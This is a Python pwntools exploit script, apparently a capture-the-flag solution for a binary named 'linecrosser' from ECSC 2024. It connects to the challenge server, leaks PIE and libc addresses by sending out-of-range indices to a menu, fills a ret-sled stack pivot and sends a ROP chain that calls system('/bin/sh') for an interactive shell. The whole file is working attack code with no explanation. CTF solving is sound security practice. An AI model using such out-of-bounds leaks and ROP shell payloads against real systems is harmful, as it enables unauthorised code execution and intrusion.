#!/usr/bin/env python3

from pwn import *

elf = ELF("./linecrosser_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("linecrosser.challs.open.ecsc2024.it", 38002)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b main_loop
                                b show_custom_card
                                breakrva 0x16BE

                                ignore 2 20
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    # leak pie
    r.sendlineafter(b'Exit\n', b'3')
    r.sendlineafter(b'Answer (1) or prompt (2)?\n', b'2')
    r.sendlineafter(b'Which one?\n', b'-1')
    r.recvuntil(b'Prompt (')
    elf.address = int(r.recvuntil(b' completions)', drop=True)) - (elf.sym.main + 46)
    log.success(f"PIE base: {hex(elf.address)}")

    # leak libc
    r.sendlineafter(b'Exit\n', b'3')
    r.sendlineafter(b'Answer (1) or prompt (2)?\n', b'2')
    r.sendlineafter(b'Which one?\n', b'42')
    r.recvuntil(b'Prompt (')
    libc.address = int(r.recvuntil(b' completions)', drop=True)) - (libc.sym["__libc_start_main_impl"]+128)
    log.success(f"libc base: {hex(libc.address)}")

    # finish allowed moves
    for _ in range(0x11):
        r.sendlineafter(b'Exit\n', b'3')
        r.sendlineafter(b'Answer (1) or prompt (2)?\n', b'2')
        r.sendlineafter(b'Which one?\n', b'0')

    r.sendlineafter(b'Exit\n', b'2')
    r.sendlineafter(b'Answer (1) or prompt (2)?\n', b'2')

    # pivot stack and rop
    payload = p64(libc.address + 0xf41c9)*(0x3b0//0x8) # ret; 
    payload += flat([
        libc.address + 0x2a3e5, # pop rdi; ret;
        next(libc.search(b"/bin/sh\x00")),
        libc.sym.system,
    ])

    r.sendafter(b'Write your prompt\n', payload.ljust(0x400, b'a'))
    r.sendlineafter(b'How many completions?\n', b'0')

    r.interactive()


if __name__ == "__main__":
    main()
